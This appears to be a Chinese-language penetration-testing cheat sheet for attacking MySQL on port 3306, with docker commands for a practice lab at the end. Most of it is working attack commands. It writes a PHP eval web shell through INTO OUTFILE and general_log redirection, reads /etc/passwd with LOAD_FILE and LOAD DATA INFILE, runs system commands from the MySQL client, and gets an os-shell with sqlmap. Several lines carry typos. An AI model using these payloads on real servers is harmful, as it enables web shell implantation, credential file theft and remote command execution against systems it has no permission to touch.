# 3306 MySQL

## 文件写入

```bash
# 文件写入
# 查询拥有写入权限的路径, 为空则代表可以写入任意到路径, 5.7 版本以前默认为空
SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';

# INTO OUTFILE 语句写入文件
SELECT '<?php @eval($_REQUEST['exec']);?>' INTO OUTFILE '/var/ww/html/phpinfo.php';

# 日志功能写入文件
SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log = "ON";
SET GLOBAL general_log_file="/var/www/html/shell.php";
SLECT '<?php phpinfo(); ?>';

# sqlmap 写入文件
sqlmap -u "URL" --file-write="/LOCAL/PATH/FILE" --file-dest="/REMOTE/PATH/FILE"
```

## 文件读取

```bash
# LOAD_FILE 语句读取文件
SELECT LOAD_FILE( "/etc/passwd" );

# LOAD DATA INFILE ... INTO TABLE 语句读取文件
USE mysql;
LOAD DATA INFILE '/etc/passwd' INTO TABLE user;
SELECT * FROM user;
```

## 执行系统命令

```bash
# SYSTEM 语句读取文件 (MySQL version 5.x)
HOST=; $USNM=root; $PSWD=root; # TARGET HOST INFO
mysql -h $HOST -u $USNM -p$PSWD
# IN MySQL CLI
SYSTEM cat /etc/passwd;
```

## GetShell

```bash
# sqlmap GetShell (需要知道网站绝对路径)
sqlmap -u "URL" --os-shell
```

## 环境搭建

```bash
# 启动环境
docker run --name mysql5.5 -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -dit --rm mysql:5.5
docker run --name mysql5.6 -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -dit --rm mysql:5.6

# 进入容器
docker exec -it mysql5.5

# 关闭和删除环境
docker container stop mysql5.5
docker container stop mysql5.6
```
